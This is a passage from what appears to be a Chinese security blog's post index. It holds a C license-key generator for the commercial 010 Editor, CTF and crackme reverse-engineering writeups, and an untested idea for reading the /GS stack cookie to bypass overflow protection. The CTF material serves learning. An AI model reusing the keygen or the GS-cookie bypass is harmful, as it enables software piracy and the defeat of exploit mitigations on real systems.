+ 15 * k3k6k2k8) &amp; 0xFF] + dword_B21DC4[(v6 + 17 * islowk1k7) &amp; 0xFF] + dword_B21DC4[(v7 + 23) &amp; 0xFF] * ((v5 + dword_B21DC4[v7]) ^ dword_B21DC4[(v7 + 63) &amp; 0xFF]); v8 = v15; &#125; v16 += 19; v17 += 13; v15 += 7; v6 += 9; v5 = dword_B21DC4[v8] + v9; v14 = v14 + 1; &#125; return v5; &#125;&#125;int main()&#123; char name[] = &quot;&quot;; char key[0x20] = &#123;0&#125;; int k4 = 0x9c;//0xac int islowk1k7 = 3;//&gt;=3 int k1_xor_k7 = ((islowk1k7^0xA7)-61)^0x18; int k3k6k2k8 = 1;//k3k6k2k8&gt;=1 &amp;&amp; k3k6k2k8&lt;0x3E8，其中任意一个值 int k3_xor_k6_k2_xor_k8 = 0xFFFF &amp; (((k3k6k2k8*11)^0x3421)-19760); k3_xor_k6_k2_xor_k8 = k3_xor_k6_k2_xor_k8^0x7892; int k3_xor_k6 = k3_xor_k6_k2_xor_k8 &amp; 0xff;//低位 int k2_xor_k8 = k3_xor_k6_k2_xor_k8 &gt;&gt; 8;//高位 int k1=0, k2=0, k3=0, k5=0, k6=0, k7=0, k8=0, k9=0, k10=0;// printf(&quot;****************************************************\\n&quot;); printf(&quot;************* 010 Editor v3.1.2 keygen *************\\n&quot;); printf(&quot;************* by anhkgg 2014-11-18 *************\\n&quot;); printf(&quot;****************************************************\\n\\n&quot;); printf(&quot;name&gt;&quot;); scanf(&quot;%s&quot;, name); if(!stricmp(name, &quot;999&quot;)) &#123; printf(&quot;name is not valid!\\n&quot;); system(&quot;pause&quot;); return 0; &#125; DWORD name_chk = ckname(name, k4==0x9C?1:0, islowk1k7&lt;2?islowk1k7:0, k3k6k2k8) ; k5 = name_chk &amp; 0xFF; k6 = (name_chk &amp; 0xFFFF)&gt;&gt;8;// k7 = (name_chk &gt;&gt; 16) &amp; 0xFF;// k8 = (name_chk &gt;&gt; 24) &amp; 0xFF;// k1 = k1_xor_k7 ^ k7;// k2 = k2_xor_k8 ^ k8; k3 = k3_xor_k6 ^ k6;// printf(&quot;key&gt;%02x%02x-%02x%02x-%02x%02x-%02x%02x\\n\\n&quot;, k1, k2, k3, k4, k5, k6, k7, k8); system(&quot;pause&quot;); return 0;&#125; 4. 其他 本次分析针对的是010 v3.1.2 希望各位大牛不要见笑，欢迎交流 网站：anhkgg.gitcafe.com， www.devilstep.com 转载请注明出处：anhkgg.gitcafe.com/010%E6%B3%A8%E5%86%8C%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/ 更新：最新版v5.0.2，分析之后，算法流程基本没有变化，只需要myCal1(k1^k7)条件更新一下就行！","tags":[{"name":"010editor","slug":"010editor","permalink":"https://anhkgg.github.io/tags/010editor/"}]},{"title":"hctf writeup","date":"2014-11-10T01:08:58.000Z","path":"hctf-writeup/","text":"1. 丘比龙的最爱传说，丘比龙是丘比特的弟弟，丘比龙是一只小爱神，虽然有两只翅膀，但因为吃多了，导致身体太胖，所以飞不起来~那么问题来了?!丘比龙吃什么食物吃多了变胖了百度之：甜甜圈 1. nvshen猫流大大发现一个女神，你能告诉我女神的名字么（名字即是flag） http://107.189.158.112/0aab9b20410fdd880c53922048023266/nvshen.zip打开大量数据，感觉是base64，解密了前一部分数据看到PNG, IHDR字符，应该就是png图片了，然后python写了段脚本：12345678910111213import base64f1 = open(&quot;nvshen.txt&quot;, &quot;r&quot;)f2 = open(&quot;nvshen.png&quot;, &quot;wb&quot;)while 1: buf = f1.read(12) if not buf: break; #print buf, base64.decodestring(buf) f2.write(base64.decodestring(buf)) f1.close()f2.close() 得到一张女神照片，纠结了会，google图片之，找到女神名字“爱新觉罗·启星”，被中间的点坑了几次，然后flag是“爱新觉罗启星”， 出题人原来喜欢她啊 3. babyCrack107.189.158.112/d55757a7ccf958399789e18e1d8199de/babyCrack.zipPEID查了下，是.net，马上祭出神奇.net reflector， 结果工具过期，重新下了个注册机，搞定，几个函数，翻了下，看到flag：hctf{bAByCtsvlmE!}123456789101112131415private void button1_Click(object sender, EventArgs e)&#123; bool flag = false; Config.user = this.textBox1.Text; string user = Config.user; string str2 = &quot;hctf&#123;bABy_CtsvlmE_!&#125;&quot;; if (str2.CompareTo(user) == 0) &#123; flag = true; &#125; if (flag) &#123; MessageBox.Show(&quot;good !!!&quot;); &#125;&#125; 4. stego_final图片隐写题，Stegsolve各种通道翻了一下，看到张二维码，用手机一扫，识别不了，背影有些黑点，又不会图片处理，ps一番，终于找到flag：flag{hctf_3xF$235#^3} 5. wzwzDingDing被坑的最惨的一道题，是个64位驱动，代码真不多，只有30多个函数，翻了一个遍，流程分析清楚，最后有个字符串提示 “OK!YOU ARE REALLY GOOD!Also, there is a } left!”就是说代码执行到这，应该会得到flag，然后这个是在IRP_MJ_DEVICE_CONTROL函数中，函数对应多个ctl code，分别是：0x88102004，0x88102008, 0x8810200C, 0x88102014, 0x88102010，以及都不是前面的一个ctl code，每个ctl code对应分支都会对偏移0x48E0的一个标志进行操作，最后得到0xFFFFFF，执行提示字符串的分支。下面是触发的ring3代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344HANDLE hDev = CreateFileA(DRV_SYM, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);if(hDev == INVALID_HANDLE_VALUE)&#123; printf(&quot;[-] open dev error %d\\n&quot;, GetLastError()); return 0;&#125;printf(&quot;[+] open dev success!\\n&quot;);char buf[20] = &quot;^lejAJ]O&quot;;DWORD dwReturn = 0;if(! DeviceIoControl(hDev, 0x88102004, buf, strlen(buf), buf, strlen(buf), &amp;dwReturn, NULL))&#123; printf(&quot;[-] dev control error %d\\n&quot;, GetLastError()); return 0;&#125;char buf1[20] = &quot;MNIII&quot;;if(! DeviceIoControl(hDev, 0x88102004, buf1, strlen(buf1), buf1, strlen(buf1), &amp;dwReturn, NULL))&#123; printf(&quot;[-] dev control error %d\\n&quot;, GetLastError()); return 0;&#125;if(! DeviceIoControl(hDev, 0x88102008, NULL, 0, NULL, 0, &amp;dwReturn, NULL))&#123; printf(&quot;[-] dev control error %d\\n&quot;, GetLastError()); return 0;&#125;//8810200Cif(! DeviceIoControl(hDev, 0x8810200C, NULL, 0, NULL, 0, &amp;dwReturn, NULL))&#123; printf(&quot;[-] dev control error %d\\n&quot;, GetLastError()); return 0;&#125; if(! DeviceIoControl(hDev, 0x88102014, NULL, 0, NULL, 0, &amp;dwReturn, NULL))&#123; printf(&quot;[-] dev control error %d\\n&quot;, GetLastError()); return 0;&#125; //88102010if(! DeviceIoControl(hDev, 0x88102010, NULL, 0, NULL, 0, &amp;dwReturn, NULL))&#123; printf(&quot;[-] dev control error %d\\n&quot;, GetLastError()); return 0;&#125; 最后就进入了提示字符分支，结果在这里 text:0000000000012361 call [rsp+0C8h+ShellCode]，就崩了，被坑了好久，这里需要结合题目提示flag: HCTF{‘intput’.encode(‘hex’)}就是需要修复那段shellcode，让其正确执行，然后顺利执行到提示字符串位置，分支中还有代码提示需要修复的代码字节位置，然后就是根据一个堆栈平衡就能修复（开始明显看不懂题意啊，坑）修复前代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152fffff880`02f85d90 l5bwzwzDingDing+0x2d90:fffff880`02f85d90 （10） 5152 adc byte ptr [rcx+52h],dl =&gt;(50 //push rax push rcxfffff880`02f85d93 53 push rbxfffff880`02f85d94 55 push rbpfffff880`02f85d95 56 push rsifffff880`02f85d96 57 push rdifffff880`02f85d97 （90） nopfffff880`02f85d98 （90） nop//push r8 (41 50fffff880`02f85d99 4151 push r9fffff880`02f85d9b 4152 push r10fffff880`02f85d9d 4153 push r11fffff880`02f85d9f 4154 push r12fffff880`02f85da1 4155 push r13fffff880`02f85da3 4156 push r14fffff880`02f85da5 4157 push r15fffff880`02f85da7 90 nopfffff880`02f85da8 （90） nop//(48 83 EC 28 sub rsp,28hfffff880`02f85da9 (90 nopfffff880`02f85daa (90 nopfffff880`02f85dab (90 nopfffff880`02f85dac 90 nopfffff880`02f85dad 48c7c600000000 mov rsi,0fffff880`02f85db4 488b040e mov rax,qword ptr [rsi+rcx]fffff880`02f85db8 4883f007 xor rax,7fffff880`02f85dbc 4889040e mov qword ptr [rsi+rcx],raxfffff880`02f85dc0 90 nopfffff880`02f85dc1 90 nopfffff880`02f85dc2 90 nopfffff880`02f85dc3 90 nopfffff880`02f85dc4 48ffc6 inc rsifffff880`02f85dc7 4883fe0b cmp rsi,0Bhfffff880`02f85dcb 74e0 je wzwzDingDing+0x2dad (fffff880`02f85dad)fffff880`02f85dcd 90 nopfffff880`02f85dce 4883c428 add rsp,28hfffff880`02f85dd2 415f pop r15fffff880`02f85dd4 415e pop r14fffff880`02f85dd6 415d pop r13fffff880`02f85dd8 415c pop r12fffff880`02f85dda 415b pop r11fffff880`02f85ddc 415a pop r10fffff880`02f85dde 4159 pop r9fffff880`02f85de0 4158 pop r8fffff880`02f85de2 5f pop rdifffff880`02f85de3 5e pop rsifffff880`02f85de4 5d pop rbpfffff880`02f85de5 5b pop rbxfffff880`02f85de6 5a pop rdxfffff880`02f85de7 (90) nop //59 pop rcx fffff880`02f85de8 58 pop raxfffff880`02f85de9 (90) nop//ret C3fffff880`02f85dea 00cc add ah,cl 修复后代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950kd&gt; u fffff880`02f85d90 l5bwzwzDingDing+0x2d90:fffff880`02f85d90 50 push raxfffff880`02f85d91 51 push rcxfffff880`02f85d92 52 push rdxfffff880`02f85d93 53 push rbxfffff880`02f85d94 55 push rbpfffff880`02f85d95 56 push rsifffff880`02f85d96 57 push rdifffff880`02f85d97 4150 push r8fffff880`02f85d99 4151 push r9fffff880`02f85d9b 4152 push r10fffff880`02f85d9d 4153 push r11fffff880`02f85d9f 4154 push r12fffff880`02f85da1 4155 push r13fffff880`02f85da3 4156 push r14fffff880`02f85da5 4157 push r15fffff880`02f85da7 90 nopfffff880`02f85da8 4883ec28 sub rsp,28hfffff880`02f85dac 90 nopfffff880`02f85dad 48c7c600000000 mov rsi,0fffff880`02f85db4 488b040e mov rax,qword ptr [rsi+rcx]fffff880`02f85db8 4883f007 xor rax,7fffff880`02f85dbc 4889040e mov qword ptr [rsi+rcx],raxfffff880`02f85dc0 90 nopfffff880`02f85dc1 90 nopfffff880`02f85dc2 90 nopfffff880`02f85dc3 90 nopfffff880`02f85dc4 48ffc6 inc rsifffff880`02f85dc7 4883fe0b cmp rsi,0Bhfffff880`02f85dcb 74e0 je wzwzDingDing+0x2dad (fffff880`02f85dad)fffff880`02f85dcd 90 nopfffff880`02f85dce 4883c428 add rsp,28hfffff880`02f85dd2 415f pop r15fffff880`02f85dd4 415e pop r14fffff880`02f85dd6 415d pop r13fffff880`02f85dd8 415c pop r12fffff880`02f85dda 415b pop r11fffff880`02f85ddc 415a pop r10fffff880`02f85dde 4159 pop r9fffff880`02f85de0 4158 pop r8fffff880`02f85de2 5f pop rdifffff880`02f85de3 5e pop rsifffff880`02f85de4 5d pop rbpfffff880`02f85de5 5b pop rbxfffff880`02f85de6 5a pop rdxfffff880`02f85de7 59 pop rcxfffff880`02f85de8 58 pop raxfffff880`02f85de9 c3 retfffff880`02f85dea 00cc add ah,cl 然后flag：HCTF{5041504883ec2859c3}，注意大小写啊 6. 其他 就这么多了，经验太少，就各路大牛路过指导","tags":[{"name":"hctf","slug":"hctf","permalink":"https://anhkgg.github.io/tags/hctf/"}]},{"title":"how to get GS cookie","date":"2014-11-05T03:32:29.000Z","path":"how-to-get-GS-cookie/","text":"Stack cookieStack cookies (/GS Switch cookie)，windows防止栈溢出的一种机制，详见。 栈中的 cookie/GS保护 /GS 编译选项会在函数的开头和结尾添加代码来阻止对典型的栈溢出漏洞（字符串缓冲区）的利用。当应用程序启动时，程序的 cookie（4 字节（dword），无符号整型）被计算出来（伪随机数）并保存在加载模块的.data 节中,在函数的开头这个 cookie 被拷贝到栈中，位于 EBP 和返回地址的正前方（位于返回地址和局部变量的中间）。[buffer][cookie][saved EBP][saved EIP]在函数的结尾处，程序会把这个 cookie 和保存在.data 节中的 cookie 进行比较。如果不相等，就说明进程栈被破坏，进程必须被终止。 栈中的 cookie/GS绕过方法挫败这种栈溢出保护机制的最直接的方法是检索/猜测/计算出 cookie 值（这样就可以用相同的 cookie覆盖栈中的 cookie），这个 cookie 有时候（很少）是一个静态值…但即使如此，它也可能包含一些不利的字符而导致不能使用它。 如何通过PE来获取GS cookie的值在PE的DataDirectory中，第10序号的是一个叫做LoadConfig的东西，保存了映像的配置数据，里面就有GS cookie，来看看这个数据结构IMAGE_LOAD_CONFIG_DIRECTORY32 12345678910111213141516171819202122typedef struct &#123; DWORD Size; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD GlobalFlagsClear; DWORD GlobalFlagsSet; DWORD CriticalSectionDefaultTimeout; DWORD DeCommitFreeBlockThreshold; DWORD DeCommitTotalFreeThreshold; DWORD LockPrefixTable; // VA DWORD MaximumAllocationSize; DWORD VirtualMemoryThreshold; DWORD ProcessHeapFlags; DWORD ProcessAffinityMask; WORD CSDVersion; WORD Reserved1; DWORD EditList; // VA DWORD SecurityCookie; // VA DWORD SEHandlerTable; // VA DWORD SEHandlerCount;&#125; IMAGE_LOAD_CONFIG_DIRECTORY32, *PIMAGE_LOAD_CONFIG_DIRECTORY32; SecurityCookieA pointer to a cookie that is used by Visual C++ or GS implementation. 所以，可以通过解析pe的方式，获取到SecurityCookie，进而绕过cookie/GS保护，这只是我的想法，也没测试过，是在分析某个sys的时间想到的，下面贴出获取Cookie的代码1234567891011121314151617181920unsigned int __stdcall myGetGSSecureCookie(PVOID ImageBase, ULONG Size)&#123; ULONG v2; // edi@1 PVOID v3; // esi@1 PVOID v4; // eax@2 unsigned int result; // eax@7 v3 = ImageBase; v2 = Size; if ( (signed int)myGetValidNtHeader(1, (unsigned int)ImageBase, Size, (int)&amp;ImageBase) &lt; 0//myGetValidNtHeader获取nt头地址 || (v4 = RtlImageDirectoryEntryToData(v3, 1u, 0xAu, &amp;Size), !v4)// 通过加载配置目录信息找到SecureCookie || !Size || Size != 0x40 &amp;&amp; Size != *(_DWORD *)v4 || *(_DWORD *)v4 &lt; 0x48u || (result = *((_DWORD *)v4 + 15), result &lt;= (unsigned int)v3)// loadcofig-&gt;SecurityCookie // A pointer to a cookie that is used by Visual C++ or GS implementation. || result &gt;= (unsigned int)(v3 + v2 - 4) ) result = 0; return result;&#125; 其他没来得及查资料，是否有完整的绕过方法，这只是自己突然分析到这，想到的，不对之处，敬请见谅。","tags":[{"name":"PE","slug":"PE","permalink":"https://anhkgg.github.io/tags/PE/"},{"name":"GS","slug":"GS","permalink":"https://anhkgg.github.io/tags/GS/"},{"name":"cookie","slug":"cookie","permalink":"https://anhkgg.github.io/tags/cookie/"}]},{"title":"ctf认识","date":"2014-11-04T07:08:11.000Z","path":"known-ctf/","text":"CTF meaningCTF: 全称Capture The Flag， 就是夺旗比赛，衍生自古代军事战争模式，两队人马前往对方基地夺旗，每队人马须在保护好己方旗帜的情况下将对方旗帜带回基地。在计算机安全领域，CTF是一种计算机安全竞赛。CTF通常有两种形式，解题模式（Jeopardy）和攻防模式（Attack-Defense）, 在解题模式的比赛中，主办方会提供一系列不同类型的赛题，比如上线一个有漏洞的服务、提供一段网络流量、给出一个加密后的数据或经过隐写后的文件等，他们将 flag 隐藏在这些赛题中，选手们通过比拼解题来一决高下；在攻防模式比赛中，主办方会事先编写一系列有漏洞的服务，并将它们安装在每个参赛队伍都相同的环境中，参赛队伍一方面需要修补自己服务的漏洞，同时也需要去攻击对手们的服务、拿到对手环境中的 flag 来得分，攻防模式的竞赛往往比解题模式的竞赛更接近真实环境，比赛过程也更加激烈。 一般资格赛采用解题模式，决赛采用攻防模式。 CTF contentCTF包含题目较广，有 逆向工程 密码学 ACM编程 web漏洞 二进制练习 网络和取证 隐写术 无线安全等等。需要深入研究某几个方向，涉及其他方向的知识。 CTF matchs国际赛比较有名的比赛：DEFCON CTFHITCON CTF 国内较有名气的信息安全比赛有：ISCC ctf2011年上海市信息安全技能竞赛全国大学生信息安全竞赛四川省大学生信息安全技术大赛全国大学生网络安全实战竞赛江西高校信息安全知识及软件设计大赛绿盟科技杯-信息安全对抗技术竞赛XCon安全焦点信息安全技术峰会 以及目前各网络公司组办的ctf比赛，如alictf, bctf, 360信息安全技术大赛 CTF starting各个方向学习参考(ctrl+c+v)： 逆向工程。我强烈建议你得到一个IDA Pro的副本，这有免费版和学生认证书。尝试下crack me的问题。写出你的C语言代码，然后进行反编译。重复这个过程，同时更改编译器的选项和程序逻辑。在编译的二进制文件中“if”声明和“select”语句有什么不同？我建议你专注于一个单一的原始架构：x86、x86_64或是ARM。在处理器手册中查找你要找的，参考有：《Practical Reverse Engineering》《Reversing: Secrets of Reverse Engineering》《The IDA Pro Book》 加密。虽然这不是我自己的强项，但这里有一些参考还是要看看的：《Applied Cryptography》《Practical Cryptography》Cryptography I ACM编程。选择一个高层次的语言，我推荐使用Python或Ruby。对于Python而言，阅读下《Dive into Python》和找一些你要加入的项目。值得一提的是Metasploit是用Ruby编写的。关于算法和数据结构的计算机科学课也要在此类中要走很长的路。看看来自CTF和其他编程的挑战，战胜他们。专注于创建一个解决方法而不是最快或是最好的方法，特别是在你刚刚开始的时候。 web漏洞。有很多的网络编程技术，在CTF中最流行的就是PHP和SQL。php.net网站（译者注：需翻墙）是一个梦幻的语言参考，只要搜索你好奇的功能。PHP之后，看到网页上存在的挑战的最常见的方法就是使用Python或Ruby脚本。主要到技术有重叠，这有一本关于网络安全漏洞的好书，是《黑客攻防技术宝典：Web实战篇》。除此之外，在学习了一些基本技术之后，你可能也想通过比较流行的免费软件工具来取得一些经验。这些在CTF竞争中也可能会偶尔用到，这些加密会和你凭经验得到的加密重叠。 二进制练习。这是我个人的爱好，我建议你在进入二进制练习前要完成逆向工程的学习。这有几个你可以独立学习的常见类型漏洞：栈溢出，堆溢出，对于初学者的格式字符串漏洞。很多是通过练习思维来辨别漏洞的类型。学习以往的漏洞是进入二进制门槛的最好途径。推荐你可以阅读：《黑客：漏洞发掘的艺术》《黑客攻防技术宝典：系统实战篇》《The Art of Software Security Assessment》 取证/网络。大多数的CTF团队往往有“一个”负责取证的人。我不是那种人，但是我建议你学习如何使用010 hex editor，不要怕做出荒谬、疯狂、随机的猜测这些问题运行的结果是怎样。最后，Dan Guido和公司最近推出了CTF领域指南，会对以上几个主题的介绍有很好的帮助。 其他Smash the Stack（漏洞利用）Crackmes.de（逆向工程）Netforce.nl（web渗透与密码学）另外，BCTF赛题会与国际CTF比赛接轨，因此可以报名参加国际CTF比赛（详情参考ctftime）进行练手，也可以随时练习往届CTF赛题（赛题集合）。 CTF stars国内ctf赛棍： HITCON被称为”新台湾之光”， 2014年DEFCON 22 CTF中，取得世界第二的成绩。 Blue-Lotus蓝莲花（blue-lotus）战队成立于清华大学网络与信息安全实验室，主要从事计算机安全攻防方面的研究。 多数主要成员为清华大学在读研究生，后吸纳包括来自浙江大学、上海交大、青岛理工、中国海洋大学、杭州电子科大等高校的多名学生， 以及若干绿盟、阿里巴巴等公司的年轻安全技术人员。在业余时间，团队组队参加多项国际知名CTF赛事， 曾作为中国的团队首次闯入全球顶级的DEFCON CTF总决赛。这里可以看到blue-lotus在各项国际CTF赛事中取得的所有成绩。 其他","tags":[{"name":"ctf","slug":"ctf","permalink":"https://anhkgg.github.io/tags/ctf/"}]},{"title":"ssctf crack5详述","date":"2014-11-04T02:13:37.000Z","path":"ssctf-crack5-study/","text":"crack5中的坑注册验证函数中，各种int 3，致使进入通过SetUnhandledExceptionFilter设置的异常处理函数TopLevelExceptionFilter，在TopLevelExceptionFilter控制验证函数中的执行流程，由于先前我用的win7 x64调试，注册毫无反应，以为验证函数无法正常完整执行，so手工乱恢复，看了writeup之后，在xp中调试，你妹，居然可以正常执行…这是坑吗 某两大神writeup中的解题思路 geek710 FROM SSEg33k 在TopLevelExceptionFilter亦有花，geek710大神的想法是，走一遍TopLevelExceptionFilter，去除功能代码，然后再要跳去执行验证函数的位置，nop验证函数中所有花，这样，一次执行完整之后，就可以得到无花的验证函数，beautiful，跟着这个思想走了一下，不晓得那弄错了，每次都异常退出，下面是提取的TopLevelExceptionFilter的大致代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727300401336 87ED xchg ebp,ebp0040134A 8BDB mov ebx,ebx ; CrackMe.004012F000401354 8B4424 04 mov eax,dword ptr ss:[esp+0x4]//STRUCT _EXCEPTION_POINTERS *ExceptionInfo 00401442 8B08 mov ecx,dword ptr ds:[eax]//exp-&gt;ExceptionRecord0040139A 8139 03000080 cmp dword ptr ds:[ecx],0x80000003 //exp-&gt;ExceptionRecord == int 30040144A ^\\0F85 14FFFFFF jnz CrackMe.00401364//不是 int 300401391 33C0 xor eax,eax0040140D C2 0400 retn 0x4//是int 30040138A 56 push esi ; kernel32.7C88578000401471 8B70 04 mov esi,dword ptr ds:[eax+0x4]//exp-&gt;ContextRecord; 0040149F 8B96 B8000000 mov edx,dword ptr ds:[esi+0xB8] ; CrackMe.0040164B004014B8 803A CC cmp byte ptr ds:[edx],0xCC004012F2 /0F85 D6000000 jnz CrackMe.004013CE //是int 300401329 42 inc edx ; CrackMe.0040164B004013B0 87ED xchg ebp,ebp004013C4 8BDB mov ebx,ebx ; CrackMe.004012F0jmp 004014A8//不是int 3了，0xCC004014A8 8A0A mov cl,byte ptr ds:[edx]004013F1 8AC1 mov al,cl004014D0 C0E0 06 shl al,0x600401477 C0E9 02 shr cl,0x200401495 02C1 add al,cl0040149A 34 0D xor al,0xD004014B0 8AC8 mov cl,al00401430 C0E9 05 shr cl,0x5004014CA C0E0 03 shl al,0x3004014D6 87ED xchg ebp,ebp004014EA 8BDB mov ebx,ebx ; CrackMe.004012F0004014F4 02C8 add cl,al004014C1 80C1 11 add cl,0x11004012FF 8AC1 mov al,cl004013AA C0E0 05 shl al,0x5004013DA C0E9 03 shr cl,0x30040146C 02C1 add al,cl0040141F 34 51 xor al,0x510040147D 8AC8 mov cl,al004013D4 C0E1 07 shl cl,0x7004013FF D0E8 shr al,100401367 87ED xchg ebp,ebp0040137B 8BDB mov ebx,ebx ; CrackMe.004012F000401385 02C8 add cl,al00401407 80E9 6F sub cl,0x6F0040145A 81E1 FF000000 and ecx,0xFF00401463 81E1 07000080 and ecx,0x8000000700401424 03D1 add edx,ecx00401307 87ED xchg ebp,ebp0040131B 8BDB mov ebx,ebx ; CrackMe.004012F000401325 42 inc edx ; CrackMe.00401653004013E7 83C8 FF or eax,0xFFFFFFFF00401416 8996 B8000000 mov dword ptr ds:[esi+0xB8],edx ; CrackMe.00401654//清楚混淆的代码，填充0x900040136E 8BCA mov ecx,edx00401370 2BCF sub ecx,edi00401372 B0 90 mov al,0x9000401374 F3:AA rep stos byte ptr es:[edi]004013E7 83C8 FF or eax,0xFFFFFFFF0040142C 5E pop esi ; kernel32.7C88578000401439 C2 0400 retn 0x4 本来这个是很妙的方法，但是无奈没成功，换一个思路 Anonymous 这个方法较麻烦，在 00401416 mov dword ptr ds:[esi+0xB8],edx 处下条件断点，byte ptr[edx] != 0xCC，每次断下之后，记录edx指向的代码（新的int 3之前），完整记录之后，就是注册验证的代码，手工记录如下（不会脚本啊）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341350040168D 6A 01 push 0x10040168F E8 30100000 call &lt;jmp.&amp;MFC42.#6334&gt;004016CE BB E2D90100 mov ebx,0x1D9E200401715 8D77 64 lea esi,dword ptr ds:[edi+0x64]00401718 6A 00 push 0x00040171A 8BCE mov ecx,esi0040171C E8 9D0F0000 call &lt;jmp.&amp;MFC42.#2915&gt;00401721 8945 F8 mov dword ptr ss:[ebp-0x8],eax0040175A 8B06 mov eax,dword ptr ds:[esi]0040175C 8B48 F8 mov ecx,dword ptr ds:[eax-0x8]0040175F 894D FC mov dword ptr ss:[ebp-0x4],ecx004017A1 8B36 mov esi,dword ptr ds:[esi]004017A3 68 0C414000 push CrackMe.0040410C004017A8 56 push esi004017A9 8B35 B4314000 mov esi,dword ptr ds:[&lt;&amp;MSVCRT._mbscmp&gt;] ; msvcrt._mbscmp004017AF FFD6 call esi004017B1 83C4 08 add esp,0x8004017B4 85C0 test eax,eax004017B6 74 4C je short CrackMe.00401804004017F2 8B47 60 mov eax,dword ptr ds:[edi+0x60]004017F5 68 0C414000 push CrackMe.0040410C004017FA 50 push eax004017FB FFD6 call esi004017FD 83C4 08 add esp,0x800401800 85C0 test eax,eax00401802 75 17 jnz short CrackMe.0040181B00401804 6A 00 push 0x000401806 6A 00 push 0x000401808 68 2C404000 push CrackMe.0040402C ; ASCII &quot;注册失败！&quot;0040180D 8BCF mov ecx,edi0040180F E8 A40E0000 call &lt;jmp.&amp;MFC42.#4224&gt;00401814 5F pop edi00401815 5E pop esi00401816 5B pop ebx00401817 8BE5 mov esp,ebp00401819 5D pop ebp0040181A C3 retn004018ED 8B45 FC mov eax,dword ptr ss:[ebp-0x4]004018F0 8B55 F8 mov edx,dword ptr ss:[ebp-0x8]004018F3 83C9 FF or ecx,0xFFFFFFFF004018F6 8D7410 01 lea esi,dword ptr ds:[eax+edx+0x1]004018FA 2BCA sub ecx,edx004018FC 8BC6 mov eax,esi00401947 0FBE50 FE movsx edx,byte ptr ds:[eax-0x2]0040194B 48 dec eax0040194C 03DA add ebx,edx00401994 8D149B lea edx,dword ptr ds:[ebx+ebx*4]00401997 8D14D3 lea edx,dword ptr ds:[ebx+edx*8]0040199A 8D1C52 lea ebx,dword ptr ds:[edx+edx*2]004019E4 8818 mov byte ptr ds:[eax],bl00401A22 81F3 3A45AC14 xor ebx,0x14AC453A00401A66 0018 add byte ptr ds:[eax],bl00401AA1 8D1401 lea edx,dword ptr ds:[ecx+eax]00401AA4 85D2 test edx,edx00401AA6 ^ 0F8F 52FEFFFF jg CrackMe.004018FE00401B42 8BC6 mov eax,esi00401B96 0FBE50 FE movsx edx,byte ptr ds:[eax-0x2]00401B9A 48 dec eax00401B9B 03DA add ebx,edx00401BD6 8D149B lea edx,dword ptr ds:[ebx+ebx*4]00401BD9 8D14D3 lea edx,dword ptr ds:[ebx+edx*8]00401BDC 8D1C52 lea ebx,dword ptr ds:[edx+edx*2]00401C2F 8818 mov byte ptr ds:[eax],bl00401C6C 81E3 46A554A4 and ebx,0xA454A54600401CAE 0018 add byte ptr ds:[eax],bl00401CF8 8D1408 lea edx,dword ptr ds:[eax+ecx]00401CFB 85D2 test edx,edx00401CFD ^ 0F8F 41FEFFFF jg CrackMe.00401B4400401D92 8BC6 mov eax,esi00401DDC 0FBE50 FE movsx edx,byte ptr ds:[eax-0x2]00401DE0 48 dec eax00401DE1 03DA add ebx,edx00401E27 8D149B lea edx,dword ptr ds:[ebx+ebx*4]00401E2A 8D14D3 lea edx,dword ptr ds:[ebx+edx*8]00401E2D 8D1C52 lea ebx,dword ptr ds:[edx+edx*2]00401E75 8818 mov byte ptr ds:[eax],bl00401ECD 81CB 37214715 or ebx,0x1547213700401F0A 0018 add byte ptr ds:[eax],bl00401F4E 8D1408 lea edx,dword ptr ds:[eax+ecx]00401F51 85D2 test edx,edx00401F53 ^ 0F8F 3BFEFFFF jg CrackMe.00401D9400401F9E 8BC3 mov eax,ebx00401FA0 33D2 xor edx,edx00401FA2 B9 1F011500 mov ecx,0x15011F00401FA7 F7F1 div ecx00401FA9 8BDA mov ebx,edx00401FF0 8D77 60 lea esi,dword ptr ds:[edi+0x60]00401FF3 6A 00 push 0x000401FF5 8BCE mov ecx,esi00401FF7 E8 C2060000 call &lt;jmp.&amp;MFC42.#2915&gt;00402043 8B16 mov edx,dword ptr ds:[esi]00402045 8B52 F8 mov edx,dword ptr ds:[edx-0x8]004020D5 33C9 xor ecx,ecx00402111 83CE FF or esi,0xFFFFFFFF00402114 8D5402 01 lea edx,dword ptr ds:[edx+eax+0x1]00402118 2BF0 sub esi,eax004021A6 0FBE42 FE movsx eax,byte ptr ds:[edx-0x2]004021AA 4A dec edx004021AB 8D0C89 lea ecx,dword ptr ds:[ecx+ecx*4]004021AE 8D4C48 D0 lea ecx,dword ptr ds:[eax+ecx*2-0x30]004021F9 880A mov byte ptr ds:[edx],cl00402245 8D0432 lea eax,dword ptr ds:[edx+esi]00402248 85C0 test eax,eax0040224A ^ 0F8F CAFEFFFF jg CrackMe.0040211A00402290 3BD9 cmp ebx,ecx00402292 75 17 jnz short CrackMe.004022AB00402294 6A 00 push 0x000402296 6A 00 push 0x000402298 68 20404000 push CrackMe.00404020 ; ASCII &quot;注册成功！&quot;0040229D 8BCF mov ecx,edi0040229F E8 14040000 call &lt;jmp.&amp;MFC42.#4224&gt;004022A4 5F pop edi004022A5 5E pop esi004022A6 5B pop ebx004022A7 8BE5 mov esp,ebp004022A9 5D pop ebp004022AA C3 retn00402384 6A 00 push 0x000402386 6A 00 push 0x000402388 68 2C404000 push CrackMe.0040402C ; ASCII &quot;注册失败！&quot;0040238D 8BCF mov ecx,edi0040238F E8 24030000 call &lt;jmp.&amp;MFC42.#4224&gt; 根据这个写出注册机就行 注册算法待续","tags":[{"name":"ssctf","slug":"ssctf","permalink":"https://anhkgg.github.io/tags/ssctf/"}]},{"title":"ssctf writeup by anhkgg","date":"2014-11-03T08:01:09.000Z","path":"ssctf-2014-11-1/","text":"ssctf wirteup1. web8 